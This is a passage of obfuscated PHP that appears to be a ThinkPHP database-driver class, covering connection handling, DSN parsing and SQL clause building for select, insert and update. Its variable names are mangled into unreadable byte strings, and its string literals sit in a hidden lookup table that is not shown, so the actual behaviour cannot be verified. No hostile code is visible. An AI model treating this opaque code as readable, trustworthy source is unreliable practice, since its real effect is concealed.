think_config($¡ÓŸ…âë[1070]), $¡ÓŸ…âë[978] => think_config($¡ÓŸ…âë[1071]), $¡ÓŸ…âë[979] => think_config($¡ÓŸ…âë[1072]), $¡ÓŸ…âë[21] => think_config($¡ÓŸ…âë[326]), $¡ÓŸ…âë[1008] => think_config($¡ÓŸ…âë[1067]), $¡ÓŸ…âë[17] => think_config($¡ÓŸ…âë[1073])); } } return $¾‘ì‹Ä•; } protected function initConnect($ºÇ òîà = true) { if (1 == think_config($_SERVER[´‹ô¯Œ][22])) { $this->_linkID = $this->multiConnect($ºÇ òîà); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $İ…÷æäª => $Á’ê¥) { $this->_linkID = $Á’ê¥; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($ŸØàîÁ™ = false) { $î’÷øÁ =& $_SERVER[´‹ô¯Œ]; static $ÎŠîç‡ = array(); static $âÃĞ™€ß = -1; if (empty($ÎŠîç‡)) { foreach ($this->config as $ÖÃéë—Š => $ˆ½ÀÜ´ñ) { $ÎŠîç‡[$ÖÃéë—Š] = explode($î’÷øÁ[50], $ˆ½ÀÜ´ñ); } } if (think_config($î’÷øÁ[1074])) { if ($ŸØàîÁ™ || think_config($î’÷øÁ[474]) === !0) { $ÑÒÓÛ˜ = floor(mt_rand(0, think_config($î’÷øÁ[1075]) - 1)); $âÃĞ™€ß = $ÑÒÓÛ˜; } else { if (is_numeric(think_config($î’÷øÁ[1076]))) { $ÑÒÓÛ˜ = think_config($î’÷øÁ[1076]); } else { $ÑÒÓÛ˜ = floor(mt_rand(think_config($î’÷øÁ[1075]), count($ÎŠîç‡[$î’÷øÁ[978]]) - 1)); } } } else { $ÑÒÓÛ˜ = floor(mt_rand(0, count($ÎŠîç‡[$î’÷øÁ[978]]) - 1)); $âÃĞ™€ß = $ÑÒÓÛ˜; } $ÑÒÓÛ˜ = $âÃĞ™€ß !== -1 ? $âÃĞ™€ß : $ÑÒÓÛ˜; $ˆ°ì„úô = array($î’÷øÁ[980] => isset($ÎŠîç‡[$î’÷øÁ[980]][$ÑÒÓÛ˜]) ? $ÎŠîç‡[$î’÷øÁ[980]][$ÑÒÓÛ˜] : $ÎŠîç‡[$î’÷øÁ[980]][0], $î’÷øÁ[981] => isset($ÎŠîç‡[$î’÷øÁ[981]][$ÑÒÓÛ˜]) ? $ÎŠîç‡[$î’÷øÁ[981]][$ÑÒÓÛ˜] : $ÎŠîç‡[$î’÷øÁ[981]][0], $î’÷øÁ[978] => isset($ÎŠîç‡[$î’÷øÁ[978]][$ÑÒÓÛ˜]) ? $ÎŠîç‡[$î’÷øÁ[978]][$ÑÒÓÛ˜] : $ÎŠîç‡[$î’÷øÁ[978]][0], $î’÷øÁ[979] => isset($ÎŠîç‡[$î’÷øÁ[979]][$ÑÒÓÛ˜]) ? $ÎŠîç‡[$î’÷øÁ[979]][$ÑÒÓÛ˜] : $ÎŠîç‡[$î’÷øÁ[979]][0], $î’÷øÁ[21] => isset($ÎŠîç‡[$î’÷øÁ[21]][$ÑÒÓÛ˜]) ? $ÎŠîç‡[$î’÷øÁ[21]][$ÑÒÓÛ˜] : $ÎŠîç‡[$î’÷øÁ[21]][0], $î’÷øÁ[1008] => isset($ÎŠîç‡[$î’÷øÁ[1008]][$ÑÒÓÛ˜]) ? $ÎŠîç‡[$î’÷øÁ[1008]][$ÑÒÓÛ˜] : $ÎŠîç‡[$î’÷øÁ[1008]][0], $î’÷øÁ[17] => isset($ÎŠîç‡[$î’÷øÁ[17]][$ÑÒÓÛ˜]) ? $ÎŠîç‡[$î’÷øÁ[17]][$ÑÒÓÛ˜] : $ÎŠîç‡[$î’÷øÁ[17]][0]); return $this->connect($ˆ°ì„úô, $ÑÒÓÛ˜); } public function parseDSN($Ò¸ı ™ç) { $òÆÌ¢“Ë =& $_SERVER[´‹ô¯Œ]; if (empty($Ò¸ı ™ç)) { return !1; } $ÏÄØ‚¡Ã = parse_url($Ò¸ı ™ç); if ($ÏÄØ‚¡Ã[$òÆÌ¢“Ë[208]]) { $É‚€Å” = array($òÆÌ¢“Ë[1053] => $ÏÄØ‚¡Ã[$òÆÌ¢“Ë[208]], $òÆÌ¢“Ë[980] => isset($ÏÄØ‚¡Ã[$òÆÌ¢“Ë[679]]) ? $ÏÄØ‚¡Ã[$òÆÌ¢“Ë[679]] : $òÆÌ¢“Ë[12], $òÆÌ¢“Ë[981] => isset($ÏÄØ‚¡Ã[$òÆÌ¢“Ë[1077]]) ? $ÏÄØ‚¡Ã[$òÆÌ¢“Ë[1077]] : $òÆÌ¢“Ë[12], $òÆÌ¢“Ë[978] => isset($ÏÄØ‚¡Ã[$òÆÌ¢“Ë[209]]) ? $ÏÄØ‚¡Ã[$òÆÌ¢“Ë[209]] : $òÆÌ¢“Ë[12], $òÆÌ¢“Ë[979] => isset($ÏÄØ‚¡Ã[$òÆÌ¢“Ë[210]]) ? $ÏÄØ‚¡Ã[$òÆÌ¢“Ë[210]] : $òÆÌ¢“Ë[12], $òÆÌ¢“Ë[21] => isset($ÏÄØ‚¡Ã[$òÆÌ¢“Ë[87]]) ? substr($ÏÄØ‚¡Ã[$òÆÌ¢“Ë[87]], 1) : $òÆÌ¢“Ë[12]); } else { preg_match($òÆÌ¢“Ë[1078], trim($Ò¸ı ™ç), $şËŸ—); $É‚€Å” = array($òÆÌ¢“Ë[1053] => $şËŸ—[1], $òÆÌ¢“Ë[980] => $şËŸ—[2], $òÆÌ¢“Ë[981] => $şËŸ—[3], $òÆÌ¢“Ë[978] => $şËŸ—[4], $òÆÌ¢“Ë[979] => $şËŸ—[5], $òÆÌ¢“Ë[21] => $şËŸ—[6]); } $É‚€Å”[$òÆÌ¢“Ë[1008]] = $òÆÌ¢“Ë[12]; return $É‚€Å”; } protected function debug() { $ïÏúò®ı =& $_SERVER[´‹ô¯Œ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ïÏúò®ı[1079]; if (think_config($ïÏúò®ı[1080])) { think_status($ïÏúò®ı[1081]); think_trace($this->queryStr . $ïÏúò®ı[1082] . think_status($ïÏúò®ı[24], $ïÏúò®ı[1081], 6) . $ïÏúò®ı[1083], $ïÏúò®ı[12], $ïÏúò®ı[1084]); } } protected function parseLock($ÇÑÖ•Ñœ = false) { $ÎÀÛ•Œ =& $_SERVER[´‹ô¯Œ]; if (!$ÇÑÖ•Ñœ) { return $ÎÀÛ•Œ[12]; } if ($ÎÀÛ•Œ[1010] == $this->dbType) { return $ÎÀÛ•Œ[1085]; } return $ÎÀÛ•Œ[1086]; } protected function parseSet($ûø¦ôÏ´) { $ëâÇªê =& $_SERVER[´‹ô¯Œ]; foreach ($ûø¦ôÏ´ as $˜ÚÇğÁ“ => $œÁÕÍùı) { if (is_array($œÁÕÍùı) && $ëâÇªê[375] == $œÁÕÍùı[0]) { $èÊûîŠ“[] = $this->parseKey($˜ÚÇğÁ“) . $ëâÇªê[518] . $œÁÕÍùı[1]; } elseif (is_scalar($œÁÕÍùı) || is_null($œÁÕÍùı)) { $èÊûîŠ“[] = $this->parseKey($˜ÚÇğÁ“) . $ëâÇªê[518] . $this->parseValue($œÁÕÍùı); } } return $ëâÇªê[1087] . implode($ëâÇªê[50], $èÊûîŠ“); } protected function bindParam($­ô©Ãëî, $æ”Õğ˜) { $this->bind[$_SERVER[´‹ô¯Œ][4] . $­ô©Ãëî] = $æ”Õğ˜; } protected function parseBind($–³ÕĞÉ«) { $–³ÕĞÉ« = array_merge($this->bind, $–³ÕĞÉ«); $this->bind = array(); return $–³ÕĞÉ«; } function parseKey(&$É†ò÷âñ, $ÕëÒöÈÕ = true) { if ($ÕëÒöÈÕ) { $É†ò÷âñ = $this->parseKeyCheck($É†ò÷âñ); } return $É†ò÷âñ; } function parseKeyCheck($Ø´âÓş) { $‰™¬î¿Æ =& $_SERVER[´‹ô¯Œ]; $Ø´âÓş = trim($Ø´âÓş); if (!preg_match($‰™¬î¿Æ[1088], $Ø´âÓş)) { think_exception($‰™¬î¿Æ[1089] . $Ø´âÓş); } return $Ø´âÓş; } protected function parseValue($°ğıß…¿) { $°«£Æà =& $_SERVER[´‹ô¯Œ]; if (is_string($°ğıß…¿)) { $°ğıß…¿ = $°«£Æà[1049] . $this->escapeString($°ğıß…¿) . $°«£Æà[1049]; } elseif (isset($°ğıß…¿[0]) && is_string($°ğıß…¿[0]) && strtolower($°ğıß…¿[0]) == $°«£Æà[375]) { $°ğıß…¿ = $this->escapeString($°ğıß…¿[1]); } elseif (is_array($°ğıß…¿)) { $°ğıß…¿ = array_map(array($this, $°«£Æà[1050]), $°ğıß…¿); } elseif (is_bool($°ğıß…¿)) { $°ğıß…¿ = $°ğıß…¿ ? $°«£Æà[91] : $°«£Æà[231]; } elseif (is_null($°ğıß…¿)) { $°ğıß…¿ = $°«£Æà[106]; } return $°ğıß…¿; } protected function parseField($œÀÛ±) { $ÆÅ¸™Üî =& $_SERVER[´‹ô¯Œ]; if (is_string($œÀÛ±) && strpos($œÀÛ±, $ÆÅ¸™Üî[50])) { $œÀÛ± = explode($ÆÅ¸™Üî[50], $œÀÛ±); } if (is_array($œÀÛ±)) { $›´·‡½ = array(); foreach ($œÀÛ± as $îĞğ û˜ => $âÅÎõÑ) { if (!is_numeric($îĞğ û˜)) { $›´·‡½[] = $this->parseKey($îĞğ û˜, !1) . $ÆÅ¸™Üî[1090] . $this->parseKey($âÅÎõÑ); } else { $›´·‡½[] = $this->parseKey($âÅÎõÑ); } } $ªú…ÉµÕ = implode($ÆÅ¸™Üî[50], $›´·‡½); } elseif (is_string($œÀÛ±) && !empty($œÀÛ±)) { $ªú…ÉµÕ = $œÀÛ±; } else { $ªú…ÉµÕ = $ÆÅ¸™Üî[223]; } return $ªú…ÉµÕ; } protected function parseTable($ÃÓı¨Á…) { $áÍÛÛé™ =& $_SERVER[´‹ô¯Œ]; if (is_array($ÃÓı¨Á…)) { $¥â”ÒéÑ = array(); foreach ($ÃÓı¨Á… as $Ë¸½œìğ => $ •È˜º) { if (!is_numeric($Ë¸½œìğ)) { $¥â”ÒéÑ[] = $this->parseKey($Ë¸½œìğ) . $áÍÛÛé™[53] . $this->parseKey($ •È˜º); } else { $¥â”ÒéÑ[] = $this->parseKey($Ë¸½œìğ); } } $ÃÓı¨Á… = $¥â”ÒéÑ; } elseif (is_string($ÃÓı¨Á…)) { if (strstr($ÃÓı¨Á…, $áÍÛÛé™[53])) { return $ÃÓı¨Á…; } $ÃÓı¨Á… = explode($áÍÛÛé™[50], $ÃÓı¨Á…); array_walk($ÃÓı¨Á…, array($this, $áÍÛÛé™[998])); } return $áÍÛÛé™[992] . trim(implode($áÍÛÛé™[1091], $ÃÓı¨Á…), $áÍÛÛé™[464]) . $áÍÛÛé™[992]; } protected function parseWhere($„…¢ùø) { $¨‰Ãöë¬ =& $_SERVER[´‹ô¯Œ]; $ÓË…ºú = $¨‰Ãöë¬[12]; if (is_string($„…¢ùø)) { $ÓË…ºú = $„…¢ùø; } else { $Äû”ÙÏË = isset($„…¢ùø[$¨‰Ãöë¬[1092]]) ? strtoupper($„…¢ùø[$¨‰Ãöë¬[1092]]) : $¨‰Ãöë¬[12]; if (in_array($Äû”ÙÏË, array($¨‰Ãöë¬[1093], $¨‰Ãöë¬[1094], $¨‰Ãöë¬[1095]))) { $Äû”ÙÏË = $¨‰Ãöë¬[53] . $Äû”ÙÏË . $¨‰Ãöë¬[53]; unset($„…¢ùø[$¨‰Ãöë¬[1092]]); } else { $Äû”ÙÏË = $¨‰Ãöë¬[1096]; } foreach ($„…¢ùø as $£ßöû¶è => $¾ÔÛî²) { $ÓË…ºú .= $¨‰Ãöë¬[357]; if (is_numeric($£ßöû¶è)) { $£ßöû¶è = $¨‰Ãöë¬[1097]; } if (0 === strpos($£ßöû¶è, $¨‰Ãöë¬[11])) { $ÓË…ºú .= $this->parseThinkWhere($£ßöû¶è, $¾ÔÛî²); } else { if (!preg_match($¨‰Ãöë¬[1098], trim($£ßöû¶è))) { think_exception(think_lang($¨‰Ãöë¬[1099]) . $¨‰Ãöë¬[4] . $£ßöû¶è); } $¨Ó×ûô¼ = is_array($¾ÔÛî²) && isset($¾ÔÛî²[$¨‰Ãöë¬[1100]]); $£ßöû¶è = trim($£ßöû¶è); if (strpos($£ßöû¶è, $¨‰Ãöë¬[215])) { $ìçÔ¯ëŞ = explode($¨‰Ãöë¬[215], $£ßöû¶è); $õ·ÜšÔ§ = array(); foreach ($ìçÔ¯ëŞ as $¥ ¿ÙÄÖ => $•¦É¦Æ) { $ŞÛÕ»éÇ = $¨Ó×ûô¼ ? $¾ÔÛî²[$¥ ¿ÙÄÖ] : $¾ÔÛî²; $õ·ÜšÔ§[] = $¨‰Ãöë¬[340] . $this->parseWhereItem($this->parseKey($•¦É¦Æ), $ŞÛÕ»éÇ) . $¨‰Ãöë¬[997]; } $ÓË…ºú .= implode($¨‰Ãöë¬[1101], $õ·ÜšÔ§); } elseif (strpos($£ßöû¶è, $¨‰Ãöë¬[287])) { $ìçÔ¯ëŞ = explode($¨‰Ãöë¬[287], $£ßöû¶è); $õ·ÜšÔ§ = array(); foreach ($ìçÔ¯ëŞ as $¥ ¿ÙÄÖ => $•¦É¦Æ) { $ŞÛÕ»éÇ = $¨Ó×ûô¼ ? $¾ÔÛî²[$¥ ¿ÙÄÖ] : $¾ÔÛî²; $õ·ÜšÔ§[] = $¨‰Ãöë¬[340] . $this->parseWhereItem($this->parseKey($•¦É¦Æ), $ŞÛÕ»éÇ) . $¨‰Ãöë¬[997]; } $ÓË…ºú .= implode($¨‰Ãöë¬[1096], $õ·ÜšÔ§); } else { $ÓË…ºú .= $this->parseWhereItem($this->parseKey($£ßöû¶è), $¾ÔÛî²); } } $ÓË…ºú .= $¨‰Ãöë¬[358] . $Äû”ÙÏË; } $ÓË…ºú = substr($ÓË…ºú, 0, -strlen($Äû”ÙÏË)); } return empty($ÓË…ºú) ? $¨‰Ãöë¬[12] : $¨‰Ãöë¬[1102] . $ÓË…ºú; } protected function parseWhereItem($ø…ÍÇÀç, $”ÈÆ‚•«) { $‘ôÂÉÉ =& $_SERVER[´‹ô¯Œ]; $Ø‡´º–¢ = $‘ôÂÉÉ[12]; if (is_array($”ÈÆ‚•«)) { if (is_string($”ÈÆ‚•«[0])) { $ƒú×Á£à = strtolower($”ÈÆ‚•«[0]); if (in_array($”ÈÆ‚•«[0], array($‘ôÂÉÉ[518], $‘ôÂÉÉ[1103], $‘ôÂÉÉ[1104], $‘ôÂÉÉ[1105], $‘ôÂÉÉ[1106], $‘ôÂÉÉ[1107]))) { $Ø‡´º–¢ .= $ø…ÍÇÀç . $‘ôÂÉÉ[53] . $”ÈÆ‚•«[0] . $‘ôÂÉÉ[53] . $this->parseValue($”ÈÆ‚•«[1]); } elseif (preg_match($‘ôÂÉÉ[1108], $”ÈÆ‚•«[0])) { $Ø‡´º–¢ .= $ø…ÍÇÀç . $‘ôÂÉÉ[53] . $this->exp[$ƒú×Á£à] . $‘ôÂÉÉ[53] . $this->parseValue($”ÈÆ‚•«[1]); } elseif (preg_match($‘ôÂÉÉ[1109], $”ÈÆ‚•«[0])) { if (is_array($”ÈÆ‚•«[1])) { $âİè·“ = isset($”ÈÆ‚•«[2]) ? strtoupper($”ÈÆ‚•«[2]) : $‘ôÂÉÉ[1094]; if (in_array($âİè·“, array($‘ôÂÉÉ[1093], $‘ôÂÉÉ[1094], $‘ôÂÉÉ[1095]))) { $µ˜ù¼Í“ = array(); foreach ($”ÈÆ‚•«[1] as $‰ƒ´ÖÙ€) { $µ˜ù¼Í“[] = $ø…ÍÇÀç . $‘ôÂÉÉ[53] . $this->exp[$ƒú×Á£à] . $‘ôÂÉÉ[53] . $this->parseValue($‰ƒ´ÖÙ€); } $Ø‡´º–¢ .= $‘ôÂÉÉ[340] . implode($‘ôÂÉÉ[53] . $âİè·“ . $‘ôÂÉÉ[53], $µ˜ù¼Í“) . $‘ôÂÉÉ[997]; } } else { $Ø‡´º–¢ .= $ø…ÍÇÀç . $‘ôÂÉÉ[53] . $this->exp[$ƒú×Á£à] . $‘ôÂÉÉ[53] . $this->parseValue($”ÈÆ‚•«[1]); } } elseif ($‘ôÂÉÉ[375] == $ƒú×Á£à) { $Ø‡´º–¢ .= $‘ôÂÉÉ[995] . $ø…ÍÇÀç . $‘ôÂÉÉ[53] . $”ÈÆ‚•«[1] . $‘ôÂÉÉ[1110]; } elseif (preg_match($‘ôÂÉÉ[1111], $”ÈÆ‚•«[0])) { $Ø‡´º–¢ .= $”ÈÆ‚•«[0]; } elseif (preg_match($‘ôÂÉÉ[1112], $”ÈÆ‚•«[0])) { if (isset($”ÈÆ‚•«[2]) && $‘ôÂÉÉ[375] == $”ÈÆ‚•«[2]) { $Ø‡´º–¢ .= $ø…ÍÇÀç . $‘ôÂÉÉ[53] . $this->exp[$ƒú×Á£à] . $‘ôÂÉÉ[53] . $”ÈÆ‚•«[1]; } else { if (is_string($”ÈÆ‚•«[1])) { $”ÈÆ‚•«[1] = explode($‘ôÂÉÉ[50], $”ÈÆ‚•«[1]); } $ÈÉ ˆ ¤ = implode($‘ôÂÉÉ[50], $this->parseValue($”ÈÆ‚•«[1])); $Ø‡´º–¢ .= $ø…ÍÇÀç . $‘ôÂÉÉ[53] . $this->exp[$ƒú×Á£à] . $‘ôÂÉÉ[995] . $ÈÉ ˆ ¤ . $‘ôÂÉÉ[997]; } } elseif (preg_match($‘ôÂÉÉ[1113], $”ÈÆ‚•«[0])) { $²»ÇíË« = is_string($”ÈÆ‚•«[1]) ? explode($‘ôÂÉÉ[50], $”ÈÆ‚•«[1]) : $”ÈÆ‚•«[1]; $Ø‡´º–¢ .= $‘ôÂÉÉ[995] . $ø…ÍÇÀç . $‘ôÂÉÉ[53] . $this->exp[$ƒú×Á£à] . $‘ôÂÉÉ[53] . $this->parseValue($²»ÇíË«[0]) . $‘ôÂÉÉ[1096] . $this->parseValue($²»ÇíË«[1]) . $‘ôÂÉÉ[358]; } else { think_exception(think_lang($‘ôÂÉÉ[1099]) . $‘ôÂÉÉ[4] . $”ÈÆ‚•«[0]); } } else { $ï–™èÊ§ = count($”ÈÆ‚•«); $Ë’î¾‘» = $‘ôÂÉÉ[12]; if (is_string($”ÈÆ‚•«[$ï–™èÊ§ - 1])) { $Ë’î¾‘» = isset($”ÈÆ‚•«[$ï–™èÊ§ - 1]) ? strtoupper($”ÈÆ‚•«[$ï–™èÊ§ - 1]) : $‘ôÂÉÉ[12]; if (in_array($Ë’î¾‘», array($‘ôÂÉÉ[1093], $‘ôÂÉÉ[1094], $‘ôÂÉÉ[1095]))) { $ï–™èÊ§ = $ï–™èÊ§ - 1; } } else { $Ë’î¾‘» = $‘ôÂÉÉ[1093]; } for ($ŸôµÕ¦ñ = 0; $ŸôµÕ¦ñ < $ï–™èÊ§; $ŸôµÕ¦ñ++) { $²»ÇíË« = is_array($”ÈÆ‚•«[$ŸôµÕ¦ñ]) ? $”ÈÆ‚•«[$ŸôµÕ¦ñ][1] : $”ÈÆ‚•«[$ŸôµÕ¦ñ]; if ($‘ôÂÉÉ[375] == strtolower($”ÈÆ‚•«[$ŸôµÕ¦ñ][0])) { $Ø‡´º–¢ .= $‘ôÂÉÉ[340] . $ø…ÍÇÀç . $‘ôÂÉÉ[53] . $²»ÇíË« . $‘ôÂÉÉ[1110] . $Ë’î¾‘» . $‘ôÂÉÉ[53]; } else { $€íú„Ë = is_array($”ÈÆ‚•«[$ŸôµÕ¦ñ]) ? $this->exp[strtolower($”ÈÆ‚•«[$ŸôµÕ¦ñ][0])] : $‘ôÂÉÉ[518]; if (!$€íú„Ë && is_array($”ÈÆ‚•«[$ŸôµÕ¦ñ]) && in_array($”ÈÆ‚•«[$ŸôµÕ¦ñ][0], array($‘ôÂÉÉ[518], $‘ôÂÉÉ[1103], $‘ôÂÉÉ[1104], $‘ôÂÉÉ[1105], $‘ôÂÉÉ[1106], $‘ôÂÉÉ[1107]))) { $€íú„Ë = $”ÈÆ‚•«[$ŸôµÕ¦ñ][0]; } $Ø‡´º–¢ .= $‘ôÂÉÉ[340] . $ø…ÍÇÀç . $‘ôÂÉÉ[53] . $€íú„Ë . $‘ôÂÉÉ[53] . $this->parseValue($²»ÇíË«) . $‘ôÂÉÉ[1110] . $Ë’î¾‘» . $‘ôÂÉÉ[53]; } } $Ø‡´º–¢ = substr($Ø‡´º–¢, 0, -4); } } else { $Ø‡´º–¢ .= $ø…ÍÇÀç . $‘ôÂÉÉ[1114] . $this->parseValue($”ÈÆ‚•«); } return $Ø‡´º–¢; } protected function parseThinkWhere($ºŞ¢Æ, $øëñÜÊÄ) { $ÍÏÒÉ²‹ =& $_SERVER[´‹ô¯Œ]; $Ø÷¸•İ­ = $ÍÏÒÉ²‹[12]; switch ($ºŞ¢Æ) { case $ÍÏÒÉ²‹[430]: $Ø÷¸•İ­ = $øëñÜÊÄ; break; case $ÍÏÒÉ²‹[1097]: $Ø÷¸•İ­ = is_string($øëñÜÊÄ) ? $øëñÜÊÄ : substr($this->parseWhere($øëñÜÊÄ), 6); break; case $ÍÏÒÉ²‹[1115]: parse_str($øëñÜÊÄ, $ı­¯—ˆ”); if (isset($ı­¯—ˆ”[$ÍÏÒÉ²‹[1092]])) { $îåÍß¿ß = $ÍÏÒÉ²‹[53] . strtoupper($ı­¯—ˆ”[$ÍÏÒÉ²‹[1092]]) . $ÍÏÒÉ²‹[53]; unset($ı­¯—ˆ”[$ÍÏÒÉ²‹[1092]]); } else { $îåÍß¿ß = $ÍÏÒÉ²‹[1096]; } $à¤ó»Úç = array(); foreach ($ı­¯—ˆ” as $³’ùÔ => $‰ŸŠ’ˆÍ) { $à¤ó»Úç[] = $this->parseKey($³’ùÔ) . $ÍÏÒÉ²‹[1114] . $this->parseValue($‰ŸŠ’ˆÍ); } $Ø÷¸•İ­ = implode($îåÍß¿ß, $à¤ó»Úç); break; } return $Ø÷¸•İ­; } protected function parseLimit($‰Ï™Ÿ¸ª) { $›ŒŒÖ†‹ =& $_SERVER[´‹ô¯Œ]; return !empty($‰Ï™Ÿ¸ª) ? $›ŒŒÖ†‹[51] . $‰Ï™Ÿ¸ª . $›ŒŒÖ†‹[53] : $›ŒŒÖ†‹[12]; } protected function parseJoin($àÀô±–) { $¸­ò‚óõ =& $_SERVER[´‹ô¯Œ]; $Ûìß‡‰À = $¸­ò‚óõ[12]; if (!empty($àÀô±–)) { if (is_array($àÀô±–)) { foreach ($àÀô±– as $ü–Ï¼² => $½®¯óôÅ) { if (!1 !== stripos($½®¯óôÅ, $¸­ò‚óõ[1116])) { $Ûìß‡‰À .= $¸­ò‚óõ[53] . $½®¯óôÅ; } else { $Ûìß‡‰À .= $¸­ò‚óõ[1117] . $½®¯óôÅ; } } } else { $Ûìß‡‰À .= $¸­ò‚óõ[1117] . $àÀô±–; } } $Ûìß‡‰À = preg_replace($¸­ò‚óõ[1118], think_config($¸­ò‚óõ[1022]) . $¸­ò‚óõ[1119], $Ûìß‡‰À); return $Ûìß‡‰À; } protected function parseOrder($¢ä¢ÀÏ‰) { $‚àÉóÔ½ =& $_SERVER[´‹ô¯Œ]; if (is_array($¢ä¢ÀÏ‰)) { $Ø¢êÇ÷õ = array(); foreach ($¢ä¢ÀÏ‰ as $¡Ï”èØ’ => $úè™”••) { if (is_numeric($¡Ï”èØ’)) { $Ø¢êÇ÷õ[] = $this->parseKey($úè™”••); } else { $úè™”•• = in_array(strtoupper(trim($úè™”••)), array($‚àÉóÔ½[1120], $‚àÉóÔ½[1121])) ? $‚àÉóÔ½[53] . $úè™”•• : $‚àÉóÔ½[12]; if (preg_match($‚àÉóÔ½[1122], $¡Ï”èØ’)) { $Ø¢êÇ÷õ[] = $this->parseKey($¡Ï”èØ’) . $úè™”••; } else { think_exception($‚àÉóÔ½[1123] . $¡Ï”èØ’); } } } $¢ä¢ÀÏ‰ = implode($‚àÉóÔ½[50], $Ø¢êÇ÷õ); } return !empty($¢ä¢ÀÏ‰) ? $‚àÉóÔ½[1124] . $¢ä¢ÀÏ‰ : $‚àÉóÔ½[12]; } protected function parseGroup($¾³¦²ºó) { $ø²õàª† =& $_SERVER[´‹ô¯Œ]; return !empty($¾³¦²ºó) ? $ø²õàª†[1125] . $¾³¦²ºó : $ø²õàª†[12]; } protected function parseHaving($Ê’úØâ) { $İ¶ÁÎŸ” =& $_SERVER[´‹ô¯Œ]; return !empty($Ê’úØâ) ? $İ¶ÁÎŸ”[1126] . $Ê’úØâ : $İ¶ÁÎŸ”[12]; } protected function parseComment($Ğª“‘ß) { $ïÈºóÛ… =& $_SERVER[´‹ô¯Œ]; return !empty($Ğª“‘ß) ? $ïÈºóÛ…[1127] . $Ğª“‘ß . $ïÈºóÛ…[1128] : $ïÈºóÛ…[12]; } protected function parseDistinct($–™¶È€º) { $‚ÒŸÀë½ =& $_SERVER[´‹ô¯Œ]; return !empty($–™¶È€º) ? $‚ÒŸÀë½[1129] : $‚ÒŸÀë½[12]; } protected function parseUnion($œª±Á“‡) { $¬ğ‰ÇĞã =& $_SERVER[´‹ô¯Œ]; if (empty($œª±Á“‡)) { return $¬ğ‰ÇĞã[12]; } if (isset($œª±Á“‡[$¬ğ‰ÇĞã[426]])) { $˜ö¾è³ = $¬ğ‰ÇĞã[1130]; unset($œª±Á“‡[$¬ğ‰ÇĞã[426]]); } else { $˜ö¾è³ = $¬ğ‰ÇĞã[1131]; } foreach ($œª±Á“‡ as $Ú–åØÇº) { $µ§Åš“[] = $˜ö¾è³ . (is_array($Ú–åØÇº) ? $this->buildSelectSql($Ú–åØÇº) : $Ú–åØÇº); } return implode($¬ğ‰ÇĞã[53], $µ§Åš“); } public function insert($³—»×¸¬, $—Í ê• = array(), $†Î±Ôİš = false) { $ÇŞñáè =& $_SERVER[´‹ô¯Œ]; $ëÆ€Á›Â = $é–—ï˜¬ = array(); $this->model = $—Í ê•[$ÇŞñáè[361]]; foreach ($³—»×¸¬ as $ŠÍŠÏÒñ => $¿‚¥¹Ş¯) { if (is_array($¿‚¥¹Ş¯) && $ÇŞñáè[375] == $¿‚¥¹Ş¯[0]) { $é–—ï˜¬[] = $this->parseKey($ŠÍŠÏÒñ); $ëÆ€Á›Â[] = $¿‚¥¹Ş¯[1]; } elseif (is_scalar($¿‚¥¹Ş¯) || is_null($¿‚¥¹Ş¯)) { $é–—ï˜¬[] = $this->parseKey($ŠÍŠÏÒñ); $ëÆ€Á›Â[] = $this->parseValue($¿‚¥¹Ş¯); } } $·Ö¦·˜á = ($†Î±Ôİš ? $ÇŞñáè[999] : $ÇŞñáè[1000]) . $ÇŞñáè[1001] . $this->parseTable($—Í ê•[$ÇŞñáè[359]]) . $ÇŞñáè[995] . implode($ÇŞñáè[50], $é–—ï˜¬) . $ÇŞñáè[996] . implode($ÇŞñáè[50], $ëÆ€Á›Â) . $ÇŞñáè[997]; $·Ö¦·˜á .= $this->parseLock(isset($—Í ê•[$ÇŞñáè[935]]) ? $—Í ê•[$ÇŞñáè[935]] : !1); $·Ö¦·˜á .= $this->parseComment(!empty($—Í ê•[$ÇŞñáè[432]]) ? $—Í ê•[$ÇŞñáè[432]] : $ÇŞñáè[12]); return $this->execute($·Ö¦·˜á, $this->parseBind(!empty($—Í ê•[$ÇŞñáè[363]]) ? $—Í ê•[$ÇŞñáè[363]] : array())); } public function selectInsert($ì›ÌìËã, $“³ÅìÎ£, $¤½“û”Ë = array()) { $¦ş›ğ® =& $_SERVER[´‹ô¯Œ]; $this->model = $¤½“û”Ë[$¦ş›ğ®[361]]; if (is_string($ì›ÌìËã)) { $ì›ÌìËã = explode($¦ş›ğ®[50], $ì›ÌìËã); } array_walk($ì›ÌìËã, array($this, $¦ş›ğ®[998])); $õ‰«ã ¢ = $¦ş›ğ®[1132] . $this->parseTable($“³ÅìÎ£) . $¦ş›ğ®[995] . implode($¦ş›ğ®[50], $ì›ÌìËã) . $¦ş›ğ®[1110]; $õ‰«ã ¢ .= $this->buildSelectSql($¤½“û”Ë); return $this->execute($õ‰«ã ¢, $this->parseBind(!empty($¤½“û”Ë[$¦ş›ğ®[363]]) ? $¤½“û”Ë[$¦ş›ğ®[363]] : array())); } public function update($Ä¸Ì©æ, $Ùİ°ó») { $ùÃ°ãëÆ =& $_SERVER[´‹ô¯Œ]; $this->model = $Ùİ°ó»[$ùÃ°ãëÆ[361]]; $ûïÉĞ¹ = $ùÃ°ãëÆ[1133] . $this->parseTable($Ùİ°ó»[$ùÃ°ãëÆ[359]]) . $this->parseSet($Ä¸Ì©æ) . $this->parseWhere(!empty($Ùİ°ó»[$ùÃ°ãëÆ[355]]) ? $Ùİ°ó»[$ùÃ°ãëÆ[355]] : $ùÃ°ãëÆ[12]) . $this->parseOrder(!empty($Ùİ°ó»[$ùÃ°ãëÆ[444]]) ? $Ùİ°ó»[$ùÃ°ãëÆ[444]] : $ùÃ°ãëÆ[12]) . $this->parseLimit(!empty($Ùİ°ó»[$ùÃ°ãëÆ[370]]) ? $Ùİ°ó»[$ùÃ°ãëÆ[370]] : $ùÃ°ãëÆ[12]) . $this->parseLock(isset($Ùİ°ó»[$ùÃ°ãëÆ[935]]) ? $Ùİ°ó»[$ùÃ°ãëÆ[935]] : !1) . $this->parseComment(!empty($Ùİ°ó»[$ùÃ°ãëÆ[432]]) ? $Ùİ°ó»[$ùÃ°ãëÆ[432]] : $ùÃ°ãëÆ[12]); return $this->execute($ûïÉĞ¹, $this->parseBind(!empty($Ùİ°ó»[$ùÃ°ãëÆ[363]]) ? 